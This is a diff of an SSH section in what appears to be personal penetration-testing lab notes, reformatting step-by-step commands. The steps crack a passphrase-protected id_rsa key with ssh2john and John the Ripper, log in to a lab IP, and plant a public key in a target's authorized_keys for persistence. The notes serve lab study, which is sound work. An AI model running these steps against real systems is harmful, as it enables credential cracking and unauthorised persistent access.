@@ -1,50 +1,58 @@
 # 22 - SSH
 
-* id\_rsa - if password is require use ssh2john to crack it
+### **Cracking a Password-Protected `id_rsa` Private Key**
 
-```sh
-chmod 600 id_rsa
-```
+1.  Set secure permissions for the key:
 
-```
-ssh2john id_rsa > ssh.hash
-```
+    ```sh
+    chmod 600 id_rsa
+    ```
+2.  Convert the RSA private key to John-the-Ripper format:
 
-```
-john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
-```
+    ```bash
+    ssh2john id_rsa > ssh.hash
+    ```
+3.  Crack the password:
 
+    {% code overflow="wrap" %}
+    ```bash
+    john --wordlist=/usr/share/wordlists/rockyou.txt ssh.hash
+    ```
+    {% endcode %}
+4.  _(Optional)_ Use custom rules for a more targeted attack:
 
+    {% code overflow="wrap" %}
+    ```bash
+    sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
+    john --wordlist=ssh.passwords --rules=sshRules ssh.hash
+    ```
+    {% endcode %}
+5.  Once cracked, use the key to SSH into the target:
 
-{% code overflow="wrap" %}
-```sh
-sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
-```
-{% endcode %}
+    ```bash
+    ssh -i id_rsa daniela@192.168.50.244
+    ```
 
-```sh
-john --wordlist=ssh.passwords --rules=sshRules ssh.hash
-```
+### **Setting Up SSH Key-Based Access (Persistence or Initial Access)**
 
-```
-ssh -i id_rsa daniela@192.168.50.244
-```
+1.  Generate SSH key pair on your machine:
 
-### Adding SSH Public key
+    ```bash
+    ssh-keygen -t rsa -b 4096
+    ```
+2. Copy the content of `id_rsa.pub`.
+3.  On the target machine:
 
-* This can be used to get ssh session, on target machine which is based on linux
+    {% code overflow="wrap" %}
+    ```bash
+    mkdir -p ~/.ssh # in home dir
+    chmod 700 ~/.ssh
+    nano ~/.ssh/authorized_keys  # paste the public key content
+    chmod 600 ~/.ssh/authorized_keys
+    ```
+    {% endcode %}
+4.  Back on your machine, SSH into the target:
 
-{% code overflow="wrap" %}
-```shell
-ssh-keygen -t rsa -b 4096 #give any password
-
-#This created both id_rsa and id_rsa.pub in ~/.ssh directory
-#Copy the content in "id_rsa.pub" and create ".ssh" directory in /home of target machine.
-chmod 700 ~/.ssh
-nano ~/.ssh/authorized_keys #enter the copied content here
-chmod 600 ~/.ssh/authorized_keys 
-
-#On Attacker machine
-ssh username@target_ip #enter password if you gave any
-```
-{% endcode %}
+    ```bash
+    ssh username@target_ip
+    ```
